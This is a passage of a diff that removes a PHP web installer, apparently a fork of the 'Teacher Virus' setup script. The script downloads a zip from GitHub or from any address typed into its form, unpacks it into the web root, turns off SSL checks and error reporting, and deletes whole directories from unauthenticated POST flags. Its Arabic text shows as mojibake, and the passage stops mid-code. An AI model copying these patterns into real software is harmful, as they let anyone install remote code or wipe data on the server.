@@ -1,1495 +1,103 @@
-
-
-<meta http-equiv="refresh" content="600" >
-
-
-
-
-<?
-
-function rrmdir($dir) {
-   if (is_dir($dir)) {
-     $objects = scandir($dir);
-     foreach ($objects as $object) {
-       if ($object != "." && $object != "..") {
-         if (filetype($dir."/".$object) == "dir") rrmdir($dir."/".$object); else unlink($dir."/".$object);
-       }
-     }
-     reset($objects);
-     rmdir($dir);
-   }
-}
-
-rrmdir('infect');
-include_once('v.php');
- $timeout = 100;
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL,"http://lifebill.life-host.info/version/version-lifepostsms.php");
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
-    $curlresult=curl_exec ($ch);
-if(curl_getinfo($ch, CURLINFO_HTTP_CODE) === 200 )
-{
-                if (preg_match("/$version/i", $curlresult)) {
-
-    } else {
-                          rrmdir('infect');
-                          echo '<meta http-equiv="refresh" content="1;url=updatemohamedgpaly.php"/>';
-                         
-
-    }  
-}elseif(curl_getinfo($ch, CURLINFO_HTTP_CODE) === 404 ){
- // echo 'Mohamedgpaly2';
-}else{
-  // echo 'Mohamedgpaly3';
-}
-rrmdir('infect');
-?>
-
-<?php
-    if(session_status()!=PHP_SESSION_ACTIVE) session_start();
-// Turn off error reporting
-error_reporting(0);
-
-    if(file_exists(getcwd().'/data/bootstrap.php'))
-    {
-        require_once(getcwd().'/data/bootstrap.php');
-        if(file_exists(getcwd().'/data/constants.php'))
-        {
-            require_once(getcwd().'/data/constants.php');
-            $protocol = SITE_URL;
-            if(file_exists(getcwd().'/IP.txt'))
-            {
-                $myfile = fopen(getcwd().'/IP.txt', "r") or die("Unable to open file!");
-                $protocol = fread($myfile,filesize(getcwd().'/IP.txt'));
-                $protocol = trim($protocol);
-            }
-        }
-        $protocol = SITE_URL;
-        if(file_exists(getcwd().'/IP.txt'))
-        {
-            $myfile = fopen(getcwd().'/IP.txt', "r") or die("Unable to open file!");
-            $protocol = fread($myfile,filesize(getcwd().'/IP.txt'));
-            $protocol = trim($protocol);
-        }
-    }
-    else
-    {
-        if(file_exists(getcwd().'/IP.txt'))
-        {
-            $myfile = fopen(getcwd().'/IP.txt', "r") or die("Unable to open file!");
-            $protocol = fread($myfile,filesize(getcwd().'/IP.txt'));
-            $protocol = trim($protocol);
-        }
-        else
-        {
-            $sSiteUrl = (isset($_SERVER["HTTP_HOST"]) ? "http://".$_SERVER["HTTP_HOST"] : '');
-            $sRequestUrl = $sSiteUrl.$_SERVER['REQUEST_URI'];
-            $protocol = $sRequestUrl;
-        }
-        define("ROOT_DIR",getcwd());
-        define('DEBUG_TEXT','0');
-        define('INFECTED_RESOURCE','G');
-        define('DEVICE_ADDRESS','');
-        define('PORT_NUMBER','5050');
-        define('SHOW_TV','0');
-        define('CHMOD','0');
-    }
-?>
-<html>
-    <head>
-        <title>ÿ™ŸÖ ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑŸÜÿ∏ÿßŸÖ ÿ®ŸÜÿ¨ÿßÿ≠ -ÿ¥ŸÉÿ±ÿ¢ - ŸÑŸÉ ŸÖ. ŸÖÿ≠ŸÖÿØ ÿ¨ÿ®ŸäŸÑŸä</title>
-        <meta charset="utf-8">
-        <style>
-               body{
-                    background-color: black;
-                    padding: 0px 0px 340px;
-                    color: #fff;
-                }
-                form{
-                    border: thin solid #fff;
-                    margin: 0px auto;
-                    padding: 15px;
-                    width: 50%;
-                }
-                @media screen
-                  and (device-width: 320px)
-                  and (device-height: 640px)
-                  {
-                        form{
-                            width: auto;
-                        }
-                }
-                @media only screen
-                and (min-device-width: 320px)
-                and (max-device-width: 480px)
-                {
-                    form{
-                            width: auto;
-                        }
-                }
-                @media only screen
-                and (min-device-width: 320px)
-                and (max-device-width: 568px)
-                {
-                    form{
-                            width: auto;
-                        }
-                }
-                @media only screen
-                and (min-device-width: 375px)
-                and (max-device-width: 667px)
-                {
-                    form{
-                            width: auto;
-                        }
-                }
-                @media only screen
-                and (min-device-width: 414px)
-                and (max-device-width: 736px)
-                {
-                    form{
-                            width: auto;
-                        }
-                }
-                @media screen
-                  and (device-width: 360px)
-                  and (device-height: 640px)
-                  {
-                      form{
-                            width: auto;
-                        }
-                }
-                @media screen
-                  and (device-width: 768px)
-                  and (device-height: 1024px)
-                  {
-                      form{
-                            width: auto;
-                        }
-                }
-                @media
-                (min-device-width: 800px)
-                and (max-device-width: 1280px) {
-                    form{
-                            width: auto;
-                        }
-              }
-                .error-message{
-                    color: red;
-                    text-align: right;
-                    width: 30%;
-                }
-                .sources{
-                    margin-left: 40px;
-                }
-                .go-button{
-                    color: #000;
-                    float: right;
-                    width: 60px;
-                }
-                .admin_img {
-                    color: #fff;
-                    float: right;
-                    padding-bottom: 10px;
-                    padding-right: 20px;
-                    padding-top: 10px;
-                }
-                a { color: #fff;}
-                .color-white{
-                    color: #fff;
-                    line-height: 15px;
-                    margin-left: 15px;
-                    margin-top: 15px;
-                }
-                .mainNav:hover {
-                        color: blue;
-                    }
-                input[type="text"] {
-                    background-image: none;
-                    border: 1px solid #ccc;
-                    border-radius: 4px;
-                    box-shadow: 0 1px 1px rgba(0, 0, 0, 0.075) inset;
-                    color: #555;
-                    display: block;
-                    float: left;
-                    font-size: 14px;
-                    height: 26px;
-                    line-height: 1.42857;
-                    padding: 0px 12px;
-                    transition: border-color 0.15s ease-in-out 0s, box-shadow 0.15s ease-in-out 0s;
-                    width: 35%;
-                    float: left;
-                    background-color: wheat;
-                }
-                .payload-details{
-                    border-bottom: 1px solid #fff;
-                    margin-bottom: 20px;
-                    text-align: center;
-                    width: 100%;
-                }
-                .mandatory{
-                    font-weight: bold;
-                    font-size: 18px;
-                }
-                #loading {
-                    font-size: 70px;
-                    font-weight: bold;
-                    color: #000;
-                    width: 100%;
-                    height: 100%;
-                    top: 0px;
-                    left: 0px;
-                    position: fixed;
-                    display: block;
-                    opacity: 0.7;
-                    background-color: #fff;
-                    z-index: 99;
-                    text-align: center;
-                }
-                #loading-image {
-                    position: absolute;
-                    top: 100px;
-                    left: 240px;
-                    z-index: 100;
-                }
-                .button
-		{
-			color: #fff;
-			text-decoration: none;
-			display: inline-block;
-			padding: 4px 10px;
-			-webkit-border-radius: 5px;
-			font: normal 14px/16px Helvetica, Arial, sans-serif;
-		}
-
-		.button.black {
-			background-image: -webkit-gradient(linear, 0% 0%, 0% 100%, from(#7d828c),color-stop(0.5, #303749), color-stop(0.5, #121a2e), to(#121a2e));
-			border: 5px solid rgba(255, 255, 255, 1);
-                        border-radius: 25px 0 0 25px;
-		}
-		.button.black:hover {
-			background-image: -webkit-gradient(linear, 0% 0%, 0% 100%,
-				from(#4286f5),
-				color-stop(0.5, #4286f5),
-				color-stop(0.5, #194fdb),
-				to(#194fdb));
-		}
-		.button.back {
-			position: relative;
-			padding-left: 5px;
-			margin-left: 8px;
-		}
-		.back.black > span {
-                        display: block;
-                        height: 20px;
-                        width: 20px;
-                        background-image: -webkit-gradient(linear, left top, right bottom,
-                               from(#7d828c),
-                               color-stop(0.5, #303749),
-                               color-stop(0.5, #121a2e),
-                               to(#121a2e));
-                        border-left: solid 1px rgba(79, 79, 79, 0.75);
-                        border-bottom: solid 1px rgba(79, 79, 79, 0.75);
-                       -webkit-transform: rotate(45deg);
-                       -webkit-mask-image: -webkit-gradient(linear, left bottom, right top,
-                               from(#000000),
-                               color-stop(0.5,#000000),
-                               color-stop(0.5, transparent),
-                               to(transparent));
-                 }
-		.back:hover > span {
-			background-image: -webkit-gradient(linear, left top, right bottom,
-				from(#4286f5),
-				color-stop(0.5, #4286f5),
-				color-stop(0.5, #194fdb),
-				to(#194fdb));
-		}
-                .arrow-left {
-                        border-bottom: 30px solid transparent;
-                        border-right: 30px solid #fff;
-                        border-top: 30px solid transparent;
-                        height: 0;
-                        width: 20px;
-                    }
-                .full-width {
-                        width: 100%;
-                        min-height: 5px;
-                    }
-                .full-widthdebug{
-                        width: 100%;
-                        min-height: 5px;
-                        margin: 15px 0px;
-                    }
-                .full-widthdebug1{
-                    width: 100%;
-                    min-height: 5px;
-                    margin: 15px 15px 15px 20px;
-                }
-                .clear-button > input {
-                    padding: 1.5px;
-                }
-                .full-radio1{
-                    width: 100%;
-                    margin: -5px 15px;
-                    min-height: 0px;
-                }
-                .full-radio{
-                    width: 100%;
-                    margin: 15px;
-                    min-height: 0px;
-                }
-                .full-inner{
-                    width: 100%;
-                    margin: 15px 15px 15px 50px;
-                    min-height: 0px;
-                }
-                .full-chmod {
-                    margin: 15px 15px 15px 29px;
-                    min-height: 5px;
-                    width: 100%;
-                }
-                .text h2{
-                    width: 100%;
-                    text-align: center;
-                }
-                #loading > h2 {
-                    font-size: 55px;
-                    text-align: center;
-                }
-        </style>
-        <script type="text/javascript">
-            function checkLoaded(loaded){
-                if(loaded == true)
-                {
-                    document.getElementById("loading").style.display = "block";
-                    document.getElementById("getinfected_form").submit();
-                }
-                else
-                {
-                    document.getElementById("loading").style.display = "none";
-                }
-            }
-        </script>
-    </head>
-    <body class="main" onload="checkLoaded(false);" style="background-color: #555555;     direction: rtl; background-attachment: fixed" background="mohamedgpaly3.jpg">
-        <div id="loading">
-            <?php
-                $sLoadingImg = ((file_exists(getcwd().'/loading_spinner.gif')) ? $protocol.'/loading_spinner.gif' : ((file_exists(ROOT_DIR.'/images/loading_spinner.gif')) ? $protocol.'/images/loading_spinner.gif' : ''));
-                if(!empty($sLoadingImg))
-                {
-            ?>
-                <img src="<?php echo $sLoadingImg; ?>">
-            <?php
-                }
-                echo is_dir(ROOT_DIR."/admin") ? "<h2>ÿ™ÿ≠ÿØŸäÿ´....</h2>" : "<h2>ÿ™ÿ±ŸÉŸäÿ® Ÿàÿ™ŸÜÿ≤ŸäŸÑ....</h2>";?>
-        </div>
-    <script>
-        checkLoaded(false);
-    </script>
-<?php
-// Turn off error reporting
-error_reporting(0);
-    $debug = (isset($_POST['show_debug']) ? $_POST['show_debug'] : (is_dir(ROOT_DIR."/admin") ? DEBUG_TEXT : 1));
-    $bChmod = isset($_POST['chmod']) ? $_POST['chmod'] : 0;
-    $_SESSION['chmod'] = $bChmod;
-    $installed=0;
-
-    $_SESSION['isValidation']['flag'] = TRUE;
-    if($_SERVER['REQUEST_METHOD'] == "POST" && !empty($_SESSION['isValidation']))
-    {
-        $bRemovePreviousInstall = isset($_POST['remove_previous_install']) ? $_POST['remove_previous_install'] : 0;
-        $bDownloadLatestVersion = isset($_POST['download_latest_version']) ? $_POST['download_latest_version'] : 0;
-        $sInfectionResource = (isset($_POST['infection_resource']) && $_POST['infection_resource'] == "branch_value") ? "G" : "I";
-        $sBranchName = trim($_POST['branch_name']);
-        $sDeviceAddress = trim($_POST['device_address']);
-        $nPort = trim($_POST['port_number']);
-        $bInfectFiles = isset($_POST["infect_files"]) ? $_POST["infect_files"] : 0;
-        $bDeleteData = isset($_POST["delete_data"]) ? $_POST["delete_data"] : 0;
-        $bDeletePayload = isset($_POST['delete_payload']) ? $_POST['delete_payload'] : 0;
-        $bDeleteAdminPayload = isset($_POST['admin_payload']) ? $_POST['admin_payload'] : 0;
-        $bDeleteContent = isset($_POST['delete_content']) ? $_POST['delete_content'] : 0;
-
-        if($_POST['infection_resource'] == 'branch_value')
-        {
-            if(empty($sBranchName))
-            {
-                $_SESSION['isValidation']['branch_name'] = 'Please enter branch!!';
-                $_SESSION['isValidation']['flag'] = FALSE;
-            }
-        }
-        if($_POST['infection_resource'] == 'infected_device')
-        {
-            if(empty($sDeviceAddress))
-            {
-                $_SESSION['isValidation']['device_address'] = 'Please enter device address!!';
-                $_SESSION['isValidation']['flag'] = FALSE;
-            }
-        }
-
-        if($_SESSION['isValidation']['flag'] == 1)
-        {
-            if($sInfectionResource == "G")
-            {
-                $_SESSION['infection_resource'] = $sInfectionResource;
-                $_SESSION['lifehost_branch'] = $sBranchName;
-                $_SESSION['device_address'] = '';
-                $_SESSION['port_number'] = '';
-            }
-            else
-            {
-                $_SESSION['infection_resource'] = $sInfectionResource;
-                $_SESSION['lifehost_branch'] = 'master';
-                $_SESSION['device_address'] = $sDeviceAddress;
-                $_SESSION['port_number'] = $nPort;
-            }
-
-            function rrmdir($dir)
-            {
-
-               if (is_dir($dir)) {
-                 $objects = scandir($dir);
-                 foreach ($objects as $object) {
-                   if ($object != "." && $object != "..") {
-
-                     if (filetype($dir."/".$object) == "dir")
-                     {
-                        rrmdir($dir."/".$object);
-                     }
-                     else
-                     {
-                         unlink($dir."/".$object);
-                     }
-                   }
-                 }
-                 reset($objects);
-                 rmdir($dir);
-               }
-            }
-            if($bDownloadLatestVersion)
-            {
-                if($bInfectFiles)
-                {
-                   rrmdir('infect');
-                }
-            }
-            if($bDeleteData)
-            {
-                rrmdir('data');
-            }
-            if($bDeletePayload)
-            {
-                rrmdir('payloads');
-            }
-            if($bDeleteAdminPayload)
-            {
-                rrmdir('admin');
-            }
-            if($bDeleteContent)
-            {
-                rrmdir('content');
-            }
-            
-            
-       
-
-
-            
-            
-            //}
-            // getinfected.php is the initial teacher virus PHP infection script that is used to install the core Teacher Virus files.
-            // Created: May 2015
-            // Contributors: Harry Longworth
-            // License: Apache 2.0
-            // TO DO:
-            // - multi lingual version?
-
-            // file needs permission 755
-            // Issues with CURL:
-            // - doesn't work out of the box with standard RPI
-            // - file permissions not set
-            // so try copy first and then CURL
-
-            if ($debug) {
-                ini_set('display_errors',1);
-                ini_set('display_startup_errors',1);
-                error_reporting(-1);
-            }
-
-            // ERROR HANDLING try below maybe?
-            // SOURCE: http://stackoverflow.com/questions/1475297/phps-white-screen-of-death
-
-            // prompt for IP address as alternative infector
-
-            function promptForIP() {
-                // Prompt for IP of alternative device and reload page
-
-                $thisurl = $_SERVER["SCRIPT_NAME"];
-                // reload page script:
-                echo "<script>
-                function buttonClick() {
-                    var address = document.getElementById('address').value;
-                    window.location ='$thisurl?ip='+address;
-                }
-                </script>";
-
-                echo "<h1>Try Alternate Source?</h1>
-                <p>Enter IP address or DNS of infected device</p>
-                <p><b>Tip:</b> You can find the IP address of an infected device in the admin page of Teacher Virus.</p>
-                <p>Address of Infected Device:</p>
-                <p><input id='address' type='text' name='address' required></p>
-                <p><button type='button' onclick='buttonClick();'>Go!</button></p>
-                ";
-
-                exit("<hr>");
-
-            } // END promptForIP
-
-            //----------
-            //Make a new directory with optional error messages
-            function makeDIR($directory,$debugtxt=0) {
-
-                // Create infect directory if it doesn't exist:
-                if (file_exists($directory)) {
-                    //if ($debugtxt) { echo "<p>Directory <b>$directory</b> already exists </p>"; }
-                    $result = true; // Return true as success is when the directory has either been created or already exists
-                } else {
-                    // Make the new temp sub_folder for unzipped files
-                    if (!mkdir($directory, 0755, true)) {
-                        if ($debugtxt) { echo "<p>Error: Could not create folder <b>$directory</b> - check file permissions";}
-                        $result= false;
-                    } else {
-                        //if ($debugtxt) { echo "Folder <b>$directory</b> Created <br>";}
-                        $result = true;
-                    } // END mkdir
-                } // END if file exists
-                return $result;
-            } // END makeDIR
-
-
-            //---------
-            // Move Directory
-
-            function moveDIR($dir,$dest="") {
-                $debug = 1;
-                $result=true;
-
-                //if($debug) { echo "<h2>Moving directory</h2><p> From:<br> $dir <br>To: $dest</p>";}
-
-                $path = dirname(__FILE__);
-                $files = scandir($dir);
-
-                foreach($files as $file) {
-                    if (substr( $file ,0,1) != ".") {
-                        $pathFile = $dir.'/'.$file;
-                        if (is_dir($pathFile)) {
-                            //if($debug) { echo "<p><b>Directory:</b> $pathFile</p>"; }
-
-                            $newDir = $dest."/".$file;
-
-                            if (!moveDIR($pathFile,$newDir)) {
-                                $result = false;
-                            }
-
-                        } else {
-                            //if($debug) {echo "<p>$pathFile is a file</p>"; }
-
-                            // $currentFile = realpath($file); // current location
-                            $currentFile = $pathFile;
-
-                            $newFile = $dest."/".$file;
-
-                            if (!file_exists($dest)) {
-                                makeDIR($dest,$debug);
-                            }
-                            // if file already exists remove it
-                            if (file_exists($newFile)) {
-                                //if($debug) { echo "<p>File $newFile already exists - Deleting</p>"; }
-                                unlink($newFile);
-                            } else {
-                                //if($debug) { echo "<p>File $newFile doesn't exist yet</p>"; }
-                            }
-
-                            // Move via rename
-                            // rename(oldname, newname)
-                            if (rename($currentFile , $newFile)) {
-                                //if($debug) { echo "<p>Moved $currentFile to $newFile</p>"; }
-                            } else {
-                                //if($debug) { echo "<p>Failed to move $currentFile to $newFile</p>"; }
-                                $result = false;
-                            } // END rename
-
-                        } // END if dir or file
-                    } // end if no dot
-                } // END foreach
-                return $result;
-            } // END moveDIR
-
-            // -------------
-            // REDIRECT PAGE
-
-            function displayRedirect() {
-
-                echo "
-                    <!DOCTYPE HTML>
-                    <html lang='en-US'>
-                    <head>
-                    <meta charset='UTF-8'>
-                    <meta http-equiv='refresh' content='1;url=play'>
-                    <script type='text/javascript'>
-                        window.location.href = 'play';
-                    </script>
-                    <title>Loading Teacher Virus</title>
-                    </head>
-                    <body>
-                        <!-- Note: don't tell people to `click` the link, just tell them that it is a link. -->
-                        <p>If you are not redirected automatically, follow the <a href='play'>link</a><p>
-                    </body>
-                    </html>
-                    ";
-            } // END displayRedirect
-
-            //-----------
-            // CHECK for Play Dir
-            // -----------
-
-            // Check play dir exists or not
-            /*if (file_exists('play')) {
-                // if play folder exists then Teacher Virus is already installed and we don't want to allow script to run again so
-                //displayRedirect();
-
-            } else {*/
-                if ($debug) { echo "<h1>ÿ™ŸÖ ÿßŸÑÿ¢ÿπÿØÿßÿØ ÿ®ŸÜÿ¨ÿßÿ≠ ÿ¥ŸÉÿ±ÿ¢ ŸÑŸÉ ÿßŸÑÿ¢ŸÜ ŸäŸÖŸÉŸÜŸÉ ÿ®ÿØÿ° ÿßŸÑÿ¢ÿ≥ÿ™ÿÆÿØÿßŸÖ</h1>";}
-                if ($debug) { echo "<h1>ÿßŸÑÿ¢ŸÜ ŸäŸÖŸÉŸÜŸÉ ÿ®ÿ®ÿ≥ÿßÿ∑Ÿá Ÿàÿ≥ŸáŸàŸÑÿ© ÿßŸÑÿØÿÆŸàŸÑ ŸÖŸÜ ÿßŸä ŸÖÿ™ÿµŸÅÿ≠ ÿπŸÑŸä ÿ¨Ÿáÿßÿ≤ ŸÉŸÖÿ®ŸäŸàÿ™ÿ± ÿπŸÑŸä ÿßŸÑÿ±ÿßÿ®ÿ∑ ÿßŸÑÿ™ÿßŸÑŸä ŸàŸÑŸÉŸÜ Ÿäÿ¥ÿ™ÿ±ÿ∑ ÿßŸÜ ŸäŸÉŸàŸÜ ÿßŸÑÿ≠ÿßÿ≥Ÿàÿ® ŸÖÿ™ÿµŸÑ ÿ®ŸÜŸÅÿ≥ ÿ¥ÿ®ŸÉŸá ÿßŸÑŸàÿßŸä ŸÅÿßŸä ÿßŸÑÿÆÿßÿµŸá ÿ®ŸÖŸàÿ®ÿßŸäŸÑŸÉ</h1>";}
-$myfile = fopen("IP.txt", "r") or die("Unable to open file!");
-echo fread($myfile,filesize("IP.txt"));
-fclose($myfile);
-                if ($debug) { echo "<h2>ŸÜÿ¥ŸÉÿ±ŸÉ ÿπŸÑŸä ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ŸÑŸÜÿ∏ÿßŸÖ Ÿàÿ™ÿ∑ÿ®ŸäŸÇ ŸÑÿßŸäŸÅ ÿ®ŸäŸÑ ÿßŸÑÿ±ÿ≥ŸÖŸäŸë</h2>";}
-
-                // play folder doesn't exist
-                // Check if ip param is set to either an IP address or a url (i.e. without http:// infront)
-                // $ip="10.1.1.38" or "test.lifehost.org"
-
-                if(isset($sDeviceAddress) && (!empty($sDeviceAddress))) {
-                    $ip= $sDeviceAddress;
-                    if($debug) {echo "<p>Address has been provided as: $ip</p>"; }
-                } else {
-                    $ip="no";
-                } // end IP is set checke
-
-            //} //  END play check
-
-            //----------------------------------
-            // Download OATSEA-lifehost.zip
-            // ------------------------------------
-            if ($debug) { echo "<h2>ŸÑŸÇÿØ ÿ™ŸÖ ÿßŸÑÿ¢ÿπÿØÿßÿØ Ÿàÿ™ŸáŸäÿ¶ÿ© ÿßŸÑŸÜÿ∏ÿßŸÖ ÿ®ŸÜÿ¨ÿßÿ≠ ŸäŸÖŸÉŸÜŸÉ ÿßŸÑÿ¢ŸÜ ÿ®ÿØÿ° ÿßŸÑÿØÿÆŸàŸÑ ŸàÿßŸÑÿπŸÖŸÑ ÿπŸÑŸä ÿßŸÑŸÜÿ∏ÿßŸÖ</h2>"; }
-
-            $infect='infect';
-            // default destination for downloaded zipped files
-
-            // Create infect directory if it doesn't exist:
-            if (!makeDIR($infect,$debug)) {
-                    // failed to make directory so exit
-                   // exit("<h3>Infection Failed!</h3>");
-            }
-
-            // Github repository details for Teacher Virus core
-            $username="MohamedAhmedAliGpaly";
-            $repo="androidbillpanel";
-
-            $download_filename = $username."-".$repo.".zip";
-            $infectdir = $infect.'/'; // infect directory with trailing slash for URL use
-
-            $zipfile = $infectdir.$download_filename;
-            $sInfectedZipFile = $infectdir.'OATSEA-getinfetced.zip';
-            // Check for IP param and set $ip if param provided
-            // ** TO DO **
-
-            // Download file if OATSEA-lifehost.zip doesn't already exist
-            if (file_exists($zipfile) && $bDownloadLatestVersion == 0)
-            {
-                $geturl = $protocol.'/'.$zipfile;
-                // TRY DOWNLOAD via copy
-               // if ($debug) { echo "<h2>Repair From Local</h2>
-                 //  <p>Will attempt to copy from <b>$geturl</b></p> ";}
-                // ** TO DO ** catch warnings
-                // get following error on MAC:
-                // Warning: copy(): SSL operation failed with code 1.
-                //$copyflag = copy($geturl,$zipfile);
-                $copyflag = TRUE;
-
-                // Code Attribution:
-                // http://stackoverflow.com/questions/8889025/unzip-a-file-with-php
-
-              //  if ($debug) {echo "<h2>Attempting to Unzip</h2><p>Zipped file:  $zipfile </p>";}
-
-                // get the absolute path to $file - not used as using location of script instead
-                // $path = pathinfo(realpath($zipfile), PATHINFO_DIRNAME);
-
-                // Create full temp sub_folder path
-                $temp_unzip_path = uniqid('unzip_temp_', true)."/";
-
-               // if($debug) { echo "Temp Unzip Path is: ".$temp_unzip_path."<br>"; }
-
-                // Make the new temp sub_folder for unzipped files
-                if (!mkdir($temp_unzip_path, 0755, true)) {
-               //     exit("<h2>Error - Infection Failed!</h2><p> Could not create unzip folder: $temp_unzip_path</p><p>File security or permissions issue?");
-                } else {
-                //    if($debug) { echo "<p>Temp unzip Folder Created! <br>"; }
-                }
-
-                umask(0);
-                $zip = new ZipArchive;
-                $zipFlag = $zip->open($zipfile);
-                if ($zipFlag == TRUE) {
-                    // extract it to the path we determined above
-                  $zip->extractTo($temp_unzip_path);
-                  // $zip->extractTo($path);
-                  $zip->close();
-                   // if($debug) { echo "<h3>Unzip Successful!</h3><p> $zipfile extracted to $temp_unzip_path </p>"; }
-                } else {
-                   // exit("<h2>Infection Failed!</h2><p> couldn't open $zipfile </p>");
-                }
-
-
-                // -------------------------
-                // Determine Subfolder Name
-                // -------------------------
-
-                // GitHub puts all files in an enclosing folder that has a changing suffix every time.
-                // It does this to indicate commits.
-                // As a result we can't assume the name of the folder.
-                // and need to determine the name of the subfolder
-
-                //if($debug) { echo "<h2>Determine subfolder</h2><p>Starting from folder: $temp_unzip_path </p>"; }
-                $subfolder='notset';
-
-                $files = scandir($temp_unzip_path);
-
-                $tally=0;
-                foreach($files as $file) {
-                    $tally++;
-                    // if($debug) {echo "Filename: $file";}
-                    if (substr( $file ,0,1) != ".") {
-                        $subfolder=$temp_unzip_path.$file;
-                    } // END if not .
-
-                } // END foreach
-
-                // if($debug) { echo "<p><b>Tally:</b> $tally </p>";}
-               // if($debug) { echo "<p>Subfolder is : $subfolder </p>";}
-
-
-                // ----------
-                // Move Files To Root
-                // ----------
-                // move unzipped files to the same directory as the script (should be root)
-                // Warning/TEST! it probably won't move hidden files?
-
-                //if($debug) { echo "<H2>Moving Files</h2>"; }
-
-                // $startingloc = $temp_unzip_path.'/'.$subfolder;
-                $startingloc = $subfolder;
-
-                //if($debug) { echo "<p>Files being moved from: $startingloc </p>"; }
-
-                $tally2=0;
-
-                $subfolder = realpath($subfolder);
-                //if($debug) { echo "<p>Real Path is : $subfolder </p>"; }
-
-                //if($debug) { echo "<p>Is subfolder directory readable? ".is_readable($subfolder)."</p>";}
-
-                $directory_iterator = new RecursiveDirectoryIterator($subfolder,FilesystemIterator::SKIP_DOTS);
-
-                $fileSPLObjects =  new RecursiveIteratorIterator($directory_iterator, RecursiveIteratorIterator::SELF_FIRST,RecursiveIteratorIterator::CATCH_GET_CHILD);
-
-                try {
-
-                  foreach($fileSPLObjects as $file) {
-                    $tally2 ++;
-                        $filename= $file->getFilename();
-                        //if($debug) { echo "<p>Current Filename: $filename </p>"; }
-
-                        if (($file->isDir())&&(substr( $filename ,0,1) != ".")) {
-                        // As it's a directory make sure it exists at destination:
-
-                        // Destination:
-                        $newDir = str_replace("/".$startingloc, '', realpath($file));
-                        // if directory doesn't exist then create it
-                        if (!makeDIR($newDir,$debug)) {
-                           // if($debug) { echo "<p>Failed to create directory: $newDir</p>"; }
-                        }
-                    } else {
-                        // It's a file so move it
-                        // ** TEST: what if directory hasn't been created yet?? or does Recursive always do the directory first
-                        $currentFile = realpath($file); // current location
-                        if(preg_match('/.gitignore/',$currentFile))
-                        {
-                            $aExplodeCurrentFile = explode('.gitignore', $currentFile);
-                            $currentFile = $aExplodeCurrentFile[0];
-                        }
-                        $newFile = str_replace("/".$startingloc, '', realpath($file)); // Destination
-                        if(preg_match('/.gitignore/',$newFile))
-                        {
-                            $aExplodeNewFile = explode('.gitignore', $newFile);
-                            $newFile = $aExplodeNewFile[0];
-                        }
-                        // if file already exists remove it
-                        if (file_exists($newFile) && !is_dir($newFile)) {
-                            //if($debug) { echo "<p>File $newFile already exists - Deleting</p>"; }
-                            ($bChmod) ? chmod($newFile, 0755) : '';
-                            unlink($newFile);
-                        }
-
-                        // Move via rename
-                        // rename(oldname, newname)
-                        //rename($currentFile, $newFile);
-                        if(!file_exists($newFile))
-                        {
-                            if (rename($currentFile , $newFile)) {
-                                ($bChmod) ? chmod($newFile, 0755) : '';
-                                //if($debug) { echo "<p>Moved $currentFile to $newFile</p>"; }
-                            } else {
-                                //if($debug) { echo "<p>Failed to move $currentFile to $newFile</p>"; }
-                                $result = false;
-                            } // END rename
-                        }
-                    }// END is Dir or File checks
-
-                  } // END foreach
-                } // END Try
-                catch (UnexpectedValueException $e) {
-                 //   echo "<h2>Error Moving Files!</h2>";
-                    if($debug) {echo "<p>There was a directory we couldn't get into!</p>";}
-                }
-                //if ($debug) {echo "<p>Loop Count: $tally2</p>";}
-
-                // --------------------
-                // HANDLE MOVE FAILURE:
-                // IF Tally2 is zero then move failed try alternative method based on scandir
-
-                if ($tally2==0) {
-                    //if($debug) { echo "<h2>File Move Failed!</h2><p> - Attempting alternative approach</p>"; }
-
-                    $destination  = dirname(__FILE__);
-
-                    //if($debug) { echo "<p>Moving files from<br>  $subfolder <br> to: $destination</p>"; }
-
-                    if (moveDIR($subfolder,$destination)) {
-                        //if($debug) { echo "<h2>Move Succeeded!</h2>"; }
-                    } else {
-                        //if($debug) { "<h2>ERROR! Move Failed!</h2><p>Infection Failed</p>"; }
-                    } // End moveDIR check
-
-                } // END try alternative move approach
-
-                // DELETE TEMP
-                // Recursively Delete temporary unzip location
-                rrmdir($temp_unzip_path);
-
-                // redirect page to admin page to commence configuration
-                // ** TO DO ***
-
-                // current test stub instead of admin page opens in new window:
-                if(file_exists(getcwd().'/data/bootstrap.php'))
-                {
-                    require(getcwd().'/data/bootstrap.php');
-                    $protocol = SITE_URL;
-                    if(file_exists(getcwd().'/IP.txt'))
-                    {
-                        $myfile = fopen(getcwd().'/IP.txt', "r") or die("Unable to open file!");
-                        $protocol = fread($myfile,filesize(getcwd().'/IP.txt'));
-                        $protocol = trim($protocol);
-                    }
-                }
-              //  echo '<h2>ÿ™ŸÖ ÿßŸÑÿ¢ŸÜÿ™Ÿáÿßÿ° ÿ¥ŸÉÿ±ÿ¢ ŸÑŸÉ</h2><h2><a href="'.$protocol.'/index.php"> ÿßŸÑÿÆÿ∑ŸàŸá ÿßŸÑÿ¢ÿÆŸäÿ±ÿ© . . </a></h2>'; $_SESSION['isValidation']['flag'] = FALSE;
-                $installed=1;
-            }
-            else
-            {
-                if ($ip=="no")
-                {
-                    // Download from github zip/master as no IP address set
-                    $geturl = (!empty($sBranchName) && isset($_POST['infection_resource']) && $_POST['infection_resource'] == "branch_value") ? "https://github.com/$username/$repo/zip/$sBranchName/" : "https://github.com/$username/$repo/zip/master/";
-                    $sGetInfectedGetUrl = "https://github.com/$username/getinfected/zip/master/";
-                }
-                else
-                {
-                    // as IP address has been set attempt download from IP address
-                   $geturl = empty($nPort) ? "http://$ip/$zipfile" : "http://$ip:$nPort/$zipfile";
-                   $sGetInfectedGetUrl = empty($nPort) ? "http://$ip/$sInfectedZipFile" : "http://$ip:$nPort/$sInfectedZipFile";
-                }
-                // TRY DOWNLOAD via copy
-               //  if ($debug) { echo "<h2>Download Files</h2>
-                 //  <p>Will attempt to download via copy from <b>$geturl</b></p> ";}
-                 //** TO DO ** catch warnings
-                // get following error on MAC:
-                // Warning: copy(): SSL operation failed with code 1.
-                $copyflag = copy($geturl,$zipfile);
-
-                if ($copyflag === TRUE)
-                {
-                 //   if($debug) { echo "<h3>Download Succeeded</h3>"; }
-                  //  if($debug) { echo "<p>Files downloaded using <b>Copy</b> instead</p>"; }
-                }
-                else
-                {
-                    // try CURL
-
-                     //if ($debug) { echo "<p>Will attempt to download via CURL from <b>$geturl</b></p> ";}
-
-                    // USE CURL to Download ZIP
-                    // Code Attribution:
